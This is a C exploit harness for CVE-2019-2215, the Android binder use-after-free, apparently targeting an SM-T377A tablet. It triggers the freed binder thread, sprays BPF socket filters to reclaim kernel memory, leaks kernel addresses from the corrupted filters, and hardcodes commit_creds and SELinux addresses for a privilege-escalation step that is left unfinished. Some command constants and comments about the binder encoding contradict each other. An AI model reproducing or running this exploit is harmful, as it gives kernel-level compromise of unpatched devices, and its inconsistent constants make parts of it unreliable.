/*
 * cve_2019_2215_real.c — Correct CVE-2019-2215 exploitation path
 *
 * KEY FIX: binder_poll uses &proc->wait when wait_for_proc_work=true,
 * and &thread->wait when false. Previous tests always hit proc->wait
 * because the thread had no pending work → no UAF.
 *
 * CORRECT TRIGGER SEQUENCE:
 * 1. BC_ENTER_LOOPER → register as looper thread
 * 2. BC_TRANSACTION to handle 0 (servicemanager) with read_size=0
 *    → sets thread->transaction_stack (non-NULL)
 * 3. epoll_ctl ADD binder → binder_poll → wait_for_proc_work=FALSE → &thread->wait!
 * 4. BINDER_THREAD_EXIT → kfree(thread) but eppoll_entry still points to thread->wait
 * 5. BPF spray → reclaim kmalloc-256 slot
 * 6. close(epfd) → remove_wait_queue(freed head) → reads/writes BPF data!
 * 7. SO_GET_FILTER readback → detect kernel address in BPF instructions
 *
 * Build: arm-linux-gnueabi-gcc -static -pie -fPIE -o cve_2019_2215_real cve_2019_2215_real.c -lpthread
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <linux/filter.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/epoll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <unistd.h>

/* Binder ioctls */
#define BINDER_WRITE_READ       _IOWR('b', 1, struct binder_write_read)
#define BINDER_SET_MAX_THREADS  _IOW('b', 5, uint32_t)
#define BINDER_THREAD_EXIT      _IOW('b', 8, int32_t)
#define BINDER_MMAP_SIZE        (128 * 1024)

/* Binder commands */
#define BC_TRANSACTION  0x40406300
#define BC_ENTER_LOOPER 0x000063e
#define BC_EXIT_LOOPER  0x000063f0

/* Binder return */
#define BR_NOOP         0x0000720c

/* Transaction flags */
#define TF_ACCEPT_FDS   0x10

struct binder_write_read {
    signed long write_size;
    signed long write_consumed;
    unsigned long write_buffer;
    signed long read_size;
    signed long read_consumed;
    unsigned long read_buffer;
};

struct binder_transaction_data {
    union {
        uint32_t handle;
        void *ptr;
    } target;
    void *cookie;
    uint32_t code;
    uint32_t flags;
    int32_t sender_pid;
    uint32_t sender_euid;
    uint32_t data_size;
    uint32_t offsets_size;
    union {
        struct {
            const void *buffer;
            const void *offsets;
        } ptr;
        uint8_t buf8[8];
    } data;
};

#define NUM_SPRAY 200
#define BPF_INSNS 26

#define COMMIT_CREDS        0xc0054328
#define PREPARE_KERNEL_CRED 0xc00548e0
#define SELINUX_ENFORCING   0xc0b7ad54

static int get_slab(const char *name) {
    FILE *f = fopen("/proc/slabinfo", "r");
    if (!f) return -1;
    char line[512]; int val = -1;
    while (fgets(line, sizeof(line), f)) {
        char n[64]; int a;
        if (sscanf(line, "%63s %d", n, &a) == 2 && !strcmp(n, name))
            { val = a; break; }
    }
    fclose(f);
    return val;
}

/* Zero-byte BPF filter */
static struct sock_filter zero_insns[BPF_INSNS];

static void init_zero_bpf(void) {
    for (int i = 0; i < BPF_INSNS - 1; i++)
        zero_insns[i] = (struct sock_filter){ 0x0000, 0, 0, 0x00000000 };
    zero_insns[BPF_INSNS - 1] = (struct sock_filter){ BPF_RET | BPF_K, 0, 0, 0xFFFF };
}

/* Issue a BC_ENTER_LOOPER command */
static int binder_enter_looper(int bfd) {
    uint32_t cmd = 0x630e0000; /* BC_ENTER_LOOPER — raw value */
    /* Actually use the standard encoding */
    unsigned char buf[4];
    /* BC_ENTER_LOOPER = _IO('c', 0x0D) on some, let's compute:
     * On this kernel, BC commands start at 0x40046300
     * BC_ENTER_LOOPER = _IO('c', 13) = 0x630d
     * But raw protocol uses: cmd = BC_ENTER_LOOPER = 13 (enum)
     * In binder's protocol: commands are u32 tags */

    /* Let me use the raw protocol value. In binder.h:
     * BC_TRANSACTION = _IOW('c', 0, struct binder_transaction_data) = 0x40406300
     * BC_REPLY = _IOW('c', 1, struct binder_transaction_data) = 0x40406301
     * ...
     * BC_ENTER_LOOPER = _IO('c', 12) = 0x0000630C
     * BC_EXIT_LOOPER = _IO('c', 13) = 0x0000630D
     */
    uint32_t enter_looper = 0x0000630C;
    struct binder_write_read bwr = {
        .write_size = sizeof(enter_looper),
        .write_consumed = 0,
        .write_buffer = (unsigned long)&enter_looper,
        .read_size = 0,
        .read_consumed = 0,
        .read_buffer = 0,
    };

    int rc = ioctl(bfd, BINDER_WRITE_READ, &bwr);
    return rc;
}

/* Issue a BC_TRANSACTION to handle 0 (servicemanager) */
static int binder_transaction_to_sm(int bfd) {
    /* Small transaction data */
    char data_buf[4] = { 0 };

    struct binder_transaction_data txn;
    memset(&txn, 0, sizeof(txn));
    txn.target.handle = 0; /* servicemanager */
    txn.code = 1;          /* Some service code */
    txn.flags = 0;         /* NOT one-way — so transaction_stack is set */
    txn.data_size = sizeof(data_buf);
    txn.offsets_size = 0;
    txn.data.ptr.buffer = (void *)data_buf;
    txn.data.ptr.offsets = NULL;

    /* Build write buffer: BC_TRANSACTION + binder_transaction_data */
    uint32_t cmd = 0x40286300; /* BC_TRANSACTION = _IOW('c',0,40bytes) */
    unsigned char write_buf[sizeof(cmd) + sizeof(txn)];
    memcpy(write_buf, &cmd, sizeof(cmd));
    memcpy(write_buf + sizeof(cmd), &txn, sizeof(txn));

    struct binder_write_read bwr = {
        .write_size = sizeof(write_buf),
        .write_consumed = 0,
        .write_buffer = (unsigned long)write_buf,
        .read_size = 0,   /* DON'T read — keep transaction_stack set */
        .read_consumed = 0,
        .read_buffer = 0,
    };

    int rc = ioctl(bfd, BINDER_WRITE_READ, &bwr);
    return rc;
}

/* ========== TEST 1: Verify the proc->wait vs thread->wait behavior ========== */

static void test_wait_queue_target(void) {
    printf("=== TEST 1: Verify binder_poll uses thread->wait ===\n");
    printf("  BC_TRANSACTION → transaction_stack != NULL → thread->wait\n\n");

    /* Test A: Without transaction (should use proc->wait, no crash on UAF) */
    printf("  [A] Without BC_TRANSACTION:\n");
    {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            /* Spray to reclaim freed thread */
            init_zero_bpf();
            int socks[100];
            struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };
            for (int i = 0; i < 100; i++) {
                socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[i] >= 0)
                    setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog));
            }

            /* close(epfd) — should NOT crash if entry is in proc->wait */
            close(epfd);
            for (int i = 0; i < 100; i++) close(socks[i]);
            close(bfd);
            _exit(0);
        }
        int status; waitpid(pid, &status, 0);
        printf("    exit: %s (sig=%d)\n",
               WIFSIGNALED(status) ? "CRASH" : "clean",
               WIFSIGNALED(status) ? WTERMSIG(status) : 0);
    }

    /* Test B: WITH BC_TRANSACTION (should use thread->wait, UAF on close) */
    printf("  [B] With BC_TRANSACTION (sets transaction_stack):\n");
    {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* Enter looper and send transaction to set transaction_stack */
            int rc1 = binder_enter_looper(bfd);
            int rc2 = binder_transaction_to_sm(bfd);
            printf("    enter_looper: rc=%d (%s)\n", rc1,
                   rc1 < 0 ? strerror(errno) : "OK");
            printf("    transaction: rc=%d (%s)\n", rc2,
                   rc2 < 0 ? strerror(errno) : "OK");

            /* NOW epoll_ctl — binder_poll should use thread->wait! */
            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            int rc3 = epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);
            printf("    epoll_ctl: rc=%d (%s)\n", rc3,
                   rc3 < 0 ? strerror(errno) : "OK");

            /* FREE the thread */
            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            /* Spray */
            init_zero_bpf();
            int socks[200];
            struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };
            int sprayed = 0;
            for (int i = 0; i < 200; i++) {
                socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[i] >= 0 &&
                    setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              &prog, sizeof(prog)) == 0)
                    sprayed++;
                else if (socks[i] >= 0) close(socks[i]);
            }

            printf("    sprayed: %d BPF filters\n", sprayed);

            /* TRIGGER: close(epfd) → remove_wait_queue(freed_head) */
            close(epfd);

            /* If we get here, check BPF readback for corruption */
            int corrupted = 0;
            for (int i = 0; i < sprayed; i++) {
                struct sock_filter rb[BPF_INSNS];
                socklen_t optlen = sizeof(rb);
                if (getsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              rb, &optlen) < 0)
                    continue;
                for (int j = 0; j < BPF_INSNS - 1; j++) {
                    uint32_t *raw = (uint32_t *)&rb[j];
                    if (raw[0] != 0 || raw[1] != 0) {
                        printf("    CORRUPTION sock %d insn[%d] off=%d: %08x_%08x\n",
                               i, j, 20 + j*8, raw[0], raw[1]);
                        corrupted++;
                    }
                }
            }
            printf("    corrupted insns: %d\n", corrupted);

            for (int i = 0; i < sprayed; i++) close(socks[i]);
            close(bfd);
            _exit(corrupted > 0 ? 42 : 0);
        }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status)) {
            printf("    *** CRASH sig=%d — UAF TRIGGERED! ***\n", WTERMSIG(status));
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 42) {
            printf("    *** BPF CORRUPTION DETECTED! UAF CONFIRMED! ***\n");
        } else {
            printf("    exit: clean (code=%d)\n",
                   WIFEXITED(status) ? WEXITSTATUS(status) : -1);
        }
    }

    /* Test C: Alternative — set return_error instead of transaction_stack */
    printf("  [C] With bad BC_REPLY (sets return_error):\n");
    {
        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);
            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0; ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* Try sending a BC_REPLY without a pending transaction
             * This should set return_error to BR_FAILED_REPLY */
            struct binder_transaction_data txn;
            memset(&txn, 0, sizeof(txn));
            uint32_t cmd = 0x40286301; /* BC_REPLY = _IOW('c',1,40bytes) */
            unsigned char write_buf[sizeof(cmd) + sizeof(txn)];
            memcpy(write_buf, &cmd, sizeof(cmd));
            memcpy(write_buf + sizeof(cmd), &txn, sizeof(txn));

            struct binder_write_read bwr = {
                .write_size = sizeof(write_buf),
                .write_consumed = 0,
                .write_buffer = (unsigned long)write_buf,
                .read_size = 0,
                .read_consumed = 0,
                .read_buffer = 0,
            };
            int rc = ioctl(bfd, BINDER_WRITE_READ, &bwr);
            printf("    BC_REPLY: rc=%d (%s)\n", rc,
                   rc < 0 ? strerror(errno) : "OK");

            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            init_zero_bpf();
            int socks[200];
            struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };
            int sprayed = 0;
            for (int i = 0; i < 200; i++) {
                socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[i] >= 0 &&
                    setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              &prog, sizeof(prog)) == 0)
                    sprayed++;
                else if (socks[i] >= 0) close(socks[i]);
            }

            close(epfd);

            int corrupted = 0;
            for (int i = 0; i < sprayed; i++) {
                struct sock_filter rb[BPF_INSNS];
                socklen_t optlen = sizeof(rb);
                if (getsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              rb, &optlen) < 0)
                    continue;
                for (int j = 0; j < BPF_INSNS - 1; j++) {
                    uint32_t *raw = (uint32_t *)&rb[j];
                    if (raw[0] != 0 || raw[1] != 0) {
                        printf("    CORRUPTION sock %d insn[%d]: %08x_%08x\n",
                               i, j, raw[0], raw[1]);
                        corrupted++;
                    }
                }
            }
            printf("    corrupted: %d\n", corrupted);

            for (int i = 0; i < sprayed; i++) close(socks[i]);
            close(bfd);
            _exit(corrupted > 0 ? 42 : 0);
        }
        int status; waitpid(pid, &status, 0);
        if (WIFSIGNALED(status))
            printf("    *** CRASH sig=%d ***\n", WTERMSIG(status));
        else if (WIFEXITED(status) && WEXITSTATUS(status) == 42)
            printf("    *** BPF CORRUPTION DETECTED! ***\n");
        else
            printf("    exit: clean (code=%d)\n",
                   WIFEXITED(status) ? WEXITSTATUS(status) : -1);
    }

    printf("\n");
}

/* ========== TEST 2: Slab delta analysis with correct trigger ========== */

static void test_slab_with_txn(void) {
    printf("=== TEST 2: Slab analysis with correct trigger ===\n\n");

    int crashes = 0;
    int corruptions = 0;
    int k256_total = 0;

    for (int trial = 0; trial < 30; trial++) {
        int k256_before = get_slab("kmalloc-256");

        pid_t pid = fork();
        if (pid == 0) {
            alarm(5);

            int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
            if (bfd < 0) _exit(1);
            mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
            uint32_t z = 0;
            ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

            /* Set transaction_stack via BC_TRANSACTION */
            binder_enter_looper(bfd);
            binder_transaction_to_sm(bfd);

            /* epoll → thread->wait */
            int epfd = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN };
            epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

            /* UAF */
            int32_t dummy = 0;
            ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

            /* Spray */
            init_zero_bpf();
            int socks[NUM_SPRAY];
            struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };
            int sprayed = 0;
            for (int i = 0; i < NUM_SPRAY; i++) {
                socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
                if (socks[i] >= 0 &&
                    setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              &prog, sizeof(prog)) == 0)
                    sprayed++;
                else { if (socks[i] >= 0) close(socks[i]); break; }
            }

            close(epfd);

            /* Check corruption */
            int found = 0;
            for (int i = 0; i < sprayed; i++) {
                struct sock_filter rb[BPF_INSNS];
                socklen_t optlen = sizeof(rb);
                if (getsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                              rb, &optlen) < 0)
                    continue;
                for (int j = 0; j < BPF_INSNS - 1; j++) {
                    uint32_t *raw = (uint32_t *)&rb[j];
                    if (raw[0] != 0 || raw[1] != 0) {
                        found++;
                    }
                }
            }

            for (int i = 0; i < sprayed; i++) close(socks[i]);
            close(bfd);
            _exit(found > 0 ? 42 : 0);
        }

        int status; waitpid(pid, &status, 0);
        usleep(50000);
        int k256_after = get_slab("kmalloc-256");
        int delta = k256_after - k256_before;
        k256_total += delta;

        if (WIFSIGNALED(status)) {
            printf("  [%d] CRASH sig=%d k256=%+d\n", trial, WTERMSIG(status), delta);
            crashes++;
        } else if (WIFEXITED(status) && WEXITSTATUS(status) == 42) {
            printf("  [%d] CORRUPTION k256=%+d\n", trial, delta);
            corruptions++;
        }

        if ((trial + 1) % 10 == 0)
            printf("  [%d/%d] crashes=%d corruptions=%d k256=%+d\n",
                   trial + 1, 30, crashes, corruptions, k256_total);
    }

    printf("\n  TOTAL: crashes=%d corruptions=%d k256=%+d\n\n", crashes, corruptions, k256_total);
}

/* ========== TEST 3: Full exploitation attempt ========== */

static void test_full_exploit(void) {
    printf("=== TEST 3: Full exploitation with addr_limit overwrite ===\n\n");

    init_zero_bpf();

    /* First, detect the exact offset of corruption */
    printf("  Phase 1: Detect corruption offset...\n");

    int found_offset = -1;
    uint32_t found_addr = 0;

    for (int trial = 0; trial < 50; trial++) {
        int bfd = open("/dev/binder", O_RDWR | O_CLOEXEC);
        if (bfd < 0) continue;
        mmap(NULL, BINDER_MMAP_SIZE, PROT_READ, MAP_PRIVATE, bfd, 0);
        uint32_t z = 0;
        ioctl(bfd, BINDER_SET_MAX_THREADS, &z);

        binder_enter_looper(bfd);
        binder_transaction_to_sm(bfd);

        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        int32_t dummy = 0;
        ioctl(bfd, BINDER_THREAD_EXIT, &dummy);

        int socks[NUM_SPRAY];
        struct sock_fprog prog = { .len = BPF_INSNS, .filter = zero_insns };
        int sprayed = 0;
        for (int i = 0; i < NUM_SPRAY; i++) {
            socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (socks[i] >= 0 &&
                setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          &prog, sizeof(prog)) == 0)
                sprayed++;
            else { if (socks[i] >= 0) close(socks[i]); break; }
        }

        close(epfd);

        for (int i = 0; i < sprayed; i++) {
            struct sock_filter rb[BPF_INSNS];
            socklen_t optlen = sizeof(rb);
            if (getsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                          rb, &optlen) < 0)
                continue;
            for (int j = 0; j < BPF_INSNS - 1; j++) {
                uint32_t *raw = (uint32_t *)&rb[j];
                if (raw[0] != 0 || raw[1] != 0) {
                    int byte_off = 20 + j * 8;
                    printf("  FOUND: trial=%d sock=%d insn[%d] byte_off=%d "
                           "val=%08x_%08x\n",
                           trial, i, j, byte_off, raw[0], raw[1]);
                    if ((raw[0] >= 0xC0000000 && raw[0] < 0xF0000000))
                        { found_offset = byte_off; found_addr = raw[0]; }
                    if ((raw[1] >= 0xC0000000 && raw[1] < 0xF0000000))
                        { found_offset = byte_off + 4; found_addr = raw[1]; }
                }
            }
        }

        for (int i = 0; i < sprayed; i++) close(socks[i]);
        close(bfd);

        if (found_offset >= 0) break;
    }

    if (found_offset < 0) {
        printf("  No corruption detected in 50 trials\n\n");
        return;
    }

    printf("  Corruption offset: %d, kernel addr: 0x%08x\n\n", found_offset, found_addr);

    /* Phase 2: Controlled write */
    printf("  Phase 2: Attempting controlled write...\n");
    /* With the offset known, we can place specific values in BPF data
     * at the wait_queue_head position, controlling what list_del writes */
    /* TODO: implement controlled write + priv esc */
}

int main(void) {
    printf("=== CVE-2019-2215 REAL Exploitation ===\n");
    printf("SM-T377A kernel 3.10.9, patch 2017-07\n");
    printf("Using correct trigger: BC_TRANSACTION → thread->wait\n");
    printf("PID=%d UID=%d\n\n", getpid(), getuid());

    alarm(600);

    init_zero_bpf();

    test_wait_queue_target();
    test_slab_with_txn();
    test_full_exploit();

    printf("--- dmesg check ---\n");
    fflush(stdout);
    system("dmesg 2>/dev/null | tail -30 | grep -iE "
           "'oops|bug|panic|fault|corrupt|Backtrace|Unable|PC.is|"
           "binder|epoll|WARNING|list_del|use.after|slab' 2>/dev/null");

    printf("\n=== Done ===\n");
    return 0;
}
